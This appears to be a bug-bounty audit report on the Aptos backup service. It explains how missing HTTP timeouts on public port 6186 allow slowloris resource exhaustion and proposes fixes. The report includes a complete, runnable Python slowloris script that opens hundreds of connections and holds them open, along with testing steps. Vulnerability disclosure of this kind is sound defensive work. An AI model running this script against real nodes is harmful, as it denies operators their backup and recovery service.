# Audit Report

## Title
Backup Service Slowloris Attack: Missing Connection Timeouts Enable Resource Exhaustion

## Summary
The Aptos backup service lacks HTTP request and response timeouts, allowing attackers to exhaust node resources via slowloris attacks. Attackers can open numerous connections and send/receive data extremely slowly, holding connections open indefinitely and preventing legitimate backup operations.

## Finding Description

The backup service HTTP server is configured without any timeout protection at multiple levels:

**1. Server Configuration Missing Timeouts**

The backup service initializes a warp HTTP server without timeout configuration: [1](#0-0) 

**2. Route Handlers Missing Timeout Filters**

The route handlers in `get_routes()` create HTTP endpoints without applying any timeout filters: [2](#0-1) 

**3. Production Deployment Exposes Service Publicly**

Production Helm charts configure the backup service to bind to `0.0.0.0:6186` (all network interfaces): [3](#0-2) [4](#0-3) 

**4. No HAProxy Protection**

Unlike other services (REST API, metrics), the backup service port 6186 is NOT protected by HAProxy with its connection limits and timeout configurations: [5](#0-4) 

The HAProxy configuration shows connection limits (`maxconn 500`) and various timeouts (`timeout client 60s`, `timeout http-request 60s`) for other services, but port 6186 is absent from the configuration.

**Attack Mechanics:**

An attacker can execute two variants of slowloris attacks:

**Attack 1: Slow Request Headers**
1. Open TCP connection to `validator-node:6186`
2. Send partial HTTP request very slowly (e.g., 1 byte per minute)
3. Never complete the request, keeping connection open indefinitely
4. Repeat for thousands of connections

**Attack 2: Slow Response Reading**  
1. Send complete GET request to streaming endpoint (e.g., `/state_snapshot/1`)
2. Server spawns task and begins streaming response through BytesSender [6](#0-5) 
3. Attacker reads response extremely slowly (1 byte per minute)
4. BytesSender's channel buffer fills up (max 100 batches) [7](#0-6) 
5. Spawned task blocks on channel send, holding resources indefinitely [8](#0-7) 

**Resource Exhaustion Impact:**

Each held connection consumes:
- 1 file descriptor (typical non-root limit: 1024)
- TCP socket buffers (~100KB per connection)
- 1 tokio task (for streaming responses)
- Application memory in BytesSender buffers

With only 1,000 connections, an attacker can exhaust file descriptors on a standard node configuration, causing:
- Backup service complete unavailability
- Potential node-wide impact (all services share file descriptor pool)
- Failed disaster recovery operations

## Impact Explanation

This vulnerability qualifies as **HIGH severity** under the Aptos Bug Bounty program:

- **Validator node slowdowns**: File descriptor exhaustion degrades entire node performance
- **API crashes**: Backup service becomes completely unavailable, failing with "connection refused" or "too many open files" errors

While the bug bounty excludes "network-level DoS attacks," this is an **application-level resource exhaustion** vulnerability exploiting missing timeout logic, not a network flood attack. The distinction is critical:
- Network-level DoS: SYN floods, amplification attacks, packet storms
- Application-level exploit: Leveraging missing timeouts in HTTP server configuration (this issue)

The backup service is critical for disaster recovery. Its unavailability could prevent validator operators from restoring nodes after failures, indirectly threatening network liveness.

## Likelihood Explanation

**Likelihood: HIGH**

- **Ease of Exploitation**: Trivial - achievable with basic networking tools (netcat, curl with rate limiting, simple Python script)
- **No Authentication**: Service has no authentication or authorization checks
- **Public Exposure**: Production configurations bind to `0.0.0.0:6186`
- **No Rate Limiting**: No application-level rate limiting or connection limits
- **Known Attack Pattern**: Slowloris is a well-documented, proven attack technique

An attacker needs only:
1. Network access to port 6186 (publicly exposed in production)
2. Ability to open TCP connections
3. Basic scripting knowledge

## Recommendation

Implement multi-layered timeout protection:

**1. Add Server-Level Timeouts**

Modify the server initialization to use hyper's `Server::builder()` with explicit timeout configuration instead of warp's simplified `serve()`:

```rust
// In storage/backup/backup-service/src/lib.rs
pub fn start_backup_service(address: SocketAddr, db: Arc<AptosDB>) -> Runtime {
    let backup_handler = db.get_backup_handler();
    let routes = get_routes(backup_handler);
    
    let runtime = aptos_runtimes::spawn_named_runtime("backup".into(), None);
    let _guard = runtime.enter();
    
    // Configure server with timeouts
    let server = warp::serve(routes)
        .bind_with_graceful_shutdown(address, async {
            // Add timeout configuration via hyper Server::builder()
        });
    
    runtime.handle().spawn(server);
    info!("Backup service spawned.");
    runtime
}
```

**2. Add Request Timeout Filter**

Apply a timeout filter to all routes:

```rust
// In storage/backup/backup-service/src/handlers/mod.rs
warp::get()
    .and(routes)
    .with(warp::filters::timeout::timeout(Duration::from_secs(300)))  // 5 min max
    .with(warp::log::custom(|info| { ... }))
    .boxed()
```

**3. Change Default Binding to Localhost**

Update production configurations to bind to `127.0.0.1:6186` instead of `0.0.0.0:6186`: [9](#0-8) 

The default already uses `127.0.0.1:6186`, but production Helm charts override this. Remove the override or add HAProxy protection.

**4. Add HAProxy Frontend (if public access required)**

If external backup access is needed, add HAProxy configuration with proper limits:

```haproxy
frontend backup-service
    mode http
    bind :6186
    timeout client 300s
    timeout http-request 60s
    default_backend backup-service

backend backup-service
    mode http
    maxconn 10
    timeout server 300s
    server backup-service-backend localhost:6187
```

## Proof of Concept

**Slowloris Attack Script (Python):**

```python
#!/usr/bin/env python3
"""
Slowloris attack against Aptos backup service
Demonstrates resource exhaustion via slow HTTP requests
"""

import socket
import time
import sys

TARGET_HOST = "validator-node.example.com"  # Replace with target
TARGET_PORT = 6186
NUM_CONNECTIONS = 500
SLEEP_INTERVAL = 60  # Send 1 byte per minute

def create_connection():
    """Open connection and send partial HTTP request"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        sock.connect((TARGET_HOST, TARGET_PORT))
        
        # Send partial GET request slowly
        sock.send(b"GET /state_snapshot/1 HTTP/1.1\r\n")
        sock.send(b"Host: ")
        
        return sock
    except Exception as e:
        print(f"Error creating connection: {e}")
        return None

def main():
    print(f"[*] Starting slowloris attack against {TARGET_HOST}:{TARGET_PORT}")
    print(f"[*] Target connections: {NUM_CONNECTIONS}")
    
    sockets = []
    
    # Phase 1: Open many connections
    print("[*] Opening connections...")
    for i in range(NUM_CONNECTIONS):
        sock = create_connection()
        if sock:
            sockets.append(sock)
            if (i + 1) % 50 == 0:
                print(f"[+] Opened {i + 1} connections")
    
    print(f"[+] Successfully opened {len(sockets)} connections")
    
    # Phase 2: Keep connections alive by sending slow data
    print("[*] Keeping connections alive with slow sends...")
    round_num = 0
    
    try:
        while True:
            round_num += 1
            print(f"[*] Round {round_num}: Sending keep-alive data...")
            
            for sock in sockets[:]:
                try:
                    # Send one more byte of the Host header
                    sock.send(b"a")
                except:
                    sockets.remove(sock)
            
            print(f"[+] Active connections: {len(sockets)}")
            
            if len(sockets) < NUM_CONNECTIONS // 2:
                print("[!] Too many connections lost, re-establishing...")
                while len(sockets) < NUM_CONNECTIONS:
                    sock = create_connection()
                    if sock:
                        sockets.append(sock)
            
            time.sleep(SLEEP_INTERVAL)
            
    except KeyboardInterrupt:
        print("\n[*] Attack stopped by user")
        for sock in sockets:
            sock.close()

if __name__ == "__main__":
    main()
```

**Testing Instructions:**

1. Deploy Aptos node with production Helm configuration (backup service on `0.0.0.0:6186`)
2. Run slowloris script: `python3 slowloris_backup.py`
3. Monitor node resources: `watch -n 1 'lsof | grep :6186 | wc -l'`
4. Attempt legitimate backup: `curl http://node:6186/db_state` (will timeout or fail)
5. Check node logs for connection errors
6. Verify file descriptor exhaustion: `ulimit -n` vs active connections

**Expected Results:**
- Hundreds of connections held open indefinitely
- Legitimate backup requests fail with timeout/connection refused
- Node file descriptor count approaches limit
- Backup service becomes unavailable

## Notes

While legitimate backup clients use `BackupServiceClient` with 60-second timeouts [10](#0-9) , attackers bypass this by connecting directly to the HTTP server without using the official client.

The vulnerability affects validator nodes and fullnodes in production Kubernetes deployments where the Helm charts configure public binding. Development/test environments using the default `127.0.0.1:6186` binding are protected by network isolation but remain vulnerable to local attacks.

### Citations

**File:** storage/backup/backup-service/src/lib.rs (L26-26)
```rust
    let server = warp::serve(routes).bind(address);
```

**File:** storage/backup/backup-service/src/handlers/mod.rs (L137-146)
```rust
    warp::get()
        .and(routes)
        .with(warp::log::custom(|info| {
            let endpoint = info.path().split('/').nth(1).unwrap_or("-");
            LATENCY_HISTOGRAM.observe_with(
                &[endpoint, info.status().as_str()],
                info.elapsed().as_secs_f64(),
            )
        }))
        .boxed()
```

**File:** terraform/helm/aptos-node/files/configs/fullnode-base.yaml (L16-16)
```yaml
  backup_service_address: "0.0.0.0:6186"
```

**File:** terraform/helm/fullnode/files/fullnode-base.yaml (L68-68)
```yaml
  backup_service_address: "0.0.0.0:6186"
```

**File:** terraform/helm/aptos-node/files/haproxy.cfg (L9-38)
```text
    # Limit the maximum number of connections to 500 (this is ~5x the validator set size)
    maxconn 500

    # Limit the maximum number of connections per second to 300 (this is ~3x the validator set size)
    maxconnrate 300

    # Limit user privileges
    user {{ $.Values.haproxy.config.user }}

## Default settings
defaults
    # Enable logging of events and traffic
    log global

    # Set the default mode to TCP
    mode tcp
    log-format "%ci:%cp [%t] %ft %b/%s %Tw/%Tc/%Tt %B %ts %ac/%fc/%bc/%sc/%rc %sq/%bq"

    # Don't log normal events
    # option dontlog-normal

    # Set timeouts for connections
    timeout client 60s
    timeout connect 10s
    timeout server 60s
    timeout queue 10s

    # Prevent long-running HTTP requests
    timeout http-request 60s
    timeout http-keep-alive 5s
```

**File:** storage/backup/backup-service/src/handlers/utils.rs (L58-62)
```rust
    let _join_handle = tokio::task::spawn_blocking(move || {
        let _timer =
            BACKUP_TIMER.timer_with(&[&format!("backup_service_bytes_sender_{}", endpoint)]);
        abort_on_error(f)(bh, sender)
    });
```

**File:** storage/backup/backup-service/src/handlers/bytes_sender.rs (L22-22)
```rust
    const MAX_BATCHES: usize = 100;
```

**File:** storage/backup/backup-service/src/handlers/bytes_sender.rs (L84-86)
```rust
        self.bytes_tx
            .blocking_send(item)
            .map_err(|e| AptosDbError::Other(format!("Failed to send to response stream. {e}")))
```

**File:** config/src/config/storage_config.rs (L436-436)
```rust
            backup_service_address: SocketAddr::new(IpAddr::V4(Ipv4Addr::LOCALHOST), 6186),
```

**File:** storage/backup/backup-cli/src/utils/backup_service_client.rs (L39-39)
```rust
    const TIMEOUT_SECS: u64 = 60;
```
